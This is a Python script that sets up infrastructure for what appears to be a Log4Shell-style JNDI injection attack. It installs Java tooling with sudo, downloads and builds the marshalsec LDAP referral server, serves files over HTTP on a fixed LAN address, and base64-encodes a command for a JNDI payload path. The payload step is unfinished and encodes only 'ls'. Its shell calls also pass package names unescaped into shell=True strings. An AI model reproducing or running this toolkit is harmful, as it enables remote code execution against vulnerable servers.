import subprocess
import threading
import base64
import http.server
import socketserver


def verify_package(package):
    is_package_installed = subprocess.Popen(
        f"apt -qq list {package}",
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=None,
        executable='/bin/bash')

    out, err = is_package_installed.communicate()

    return out


def install_package(package):

    out = verify_package(package)

    if len(out) == 0:
        process = subprocess.Popen(
            f"sudo apt install {package}",
            shell=True,
            stdin=None,
            stdout=open("/dev/null", "w"),
            stderr=None,
            executable="/bin/bash")

        print(f"Installing {package}")
        process.wait()
        print(f"{package} installed !")

    else:
        print(f"{package} is already installed !")


def deploy_ldap_server():

	print('Downloading LDAP_Server..')
	package = subprocess.Popen(
        'wget https://github.com/mbechler/marshalsec/archive/refs/heads/master.zip',
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.DEVNULL,
        executable="/bin/bash")
	package.wait()
	print('Download OK!')
 
	print('Unzipping marshalsec..')
	unzip_marshalsec = subprocess.Popen(
        'unzip master.zip',
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.DEVNULL,
        executable="/bin/bash")
	unzip_marshalsec.wait()
	print("Package unzipped !")

	print('Building package..')
	build_marshalsec = subprocess.Popen(
        'cd marshalsec-master; sudo mvn clean package -DskipTests',
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.DEVNULL,
        executable="/bin/bash")
	build_marshalsec.wait()
	print("Package built !")


def launch_HTTP_server(ip):
    PORT = 8000

    Handler = http.server.SimpleHTTPRequestHandler

    with socketserver.TCPServer((ip, PORT), Handler) as httpd:
        print(f"Listening on : {PORT}")
        httpd.serve_forever()


def forge_exploit(type, exploit):

    # -r reverse, -c command
    if type == 'command':
        exploit = base64.b64encode(exploit.encode("UTF-8"))
        print(exploit)
        # /Basic/Command/Base64/[base64_encoded_cmd]


maven_install = threading.Thread(target=install_package, args=('maven',))
java_install = threading.Thread(
    target=install_package, args=('openjdk-11-jdk',))
unzip_install = threading.Thread(target=install_package, args=('unzip',))

maven_install.start()
java_install.start()
unzip_install.start()

deploy_ldap_server()
launch_HTTP_server('192.168.1.86')
forge_exploit('command', 'ls')
